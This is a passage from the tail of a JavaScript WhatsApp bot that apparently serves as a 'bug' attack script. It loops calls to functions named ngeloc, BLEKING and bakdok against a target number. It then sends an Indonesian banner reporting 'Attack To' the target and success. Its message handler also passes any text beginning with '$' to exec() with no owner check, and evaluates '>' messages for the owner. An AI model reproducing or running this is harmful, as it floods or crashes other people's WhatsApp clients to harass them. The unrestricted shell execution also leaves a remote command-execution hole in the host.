await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
await reply(`━━━━━━━巛 ᴀᴅᴀ ᴘᴀɴɴᴏғғɪᴄɪᴀʟ ᴊᴀɴɢᴀɴ ʟᴀʀɪ 彡

💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥

┈┈┈┈▕▔╱▔▔▔━▁
┈┈┈▕▔╱╱╱👁┈╲▂▔▔╲
┈┈▕▔╱╱╱╱💧▂▂▂▂▂▂▏
┈▕▔╱▕▕╱╱╱┈▽▽▽▽▽
▕▔╱┊┈╲╲╲╲▂△△△△
▔╱┊┈╱▕╲▂▂▂▂▂▂╱
╱┊┈╱┉▕┉┋╲┈ KASHIAN 
┗━━━━━━━━━━━━━━━━━━┛
⌕ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 ⚊≫  ${target} ☠︎
⌥ 𝐓𝐲𝐩𝐞 𝐁𝐮𝐠 >> ${command} 
𝐒𝐜𝐫𝐢𝐩𝐭 𝐕 𝟐.𝟎 𝐌𝐞𝐦𝐚𝐧𝐠 𝐆𝐚𝐝𝐚 𝐎𝐛𝐚𝐭 ⃟🥶⃟
𝐒𝐮𝐜𝐜𝐞𝐬 𝐁𝐮𝐠 !!

_! 𝐉𝐢𝐤𝐚 𝐓𝐢𝐝𝐚𝐤 𝐂𝟏 𝐌𝐚𝐤𝐚 𝐃𝐞𝐥𝐚𝐲 𝐌𝐚𝐤𝐞𝐫 !_

[ 𝙺𝚊𝚕𝚘 𝚋𝚞𝚐 𝚘𝚛𝚊𝚗𝚐 𝚊𝚝𝚊𝚞 𝚋𝚞𝚕𝚕𝚢 𝚘𝚛𝚊𝚗𝚐 𝚓𝚊𝚗𝚐𝚊𝚗 𝚊𝚗𝚎𝚑 𝚊𝚗𝚎𝚑 𝚜𝚊𝚖𝚊 𝚙𝚊𝚗𝚗𝙾𝚏𝚏𝚒𝚌𝚒𝚊𝙻 ] 🥶🥵`)
}
break
				
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
PannOfficiaL.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})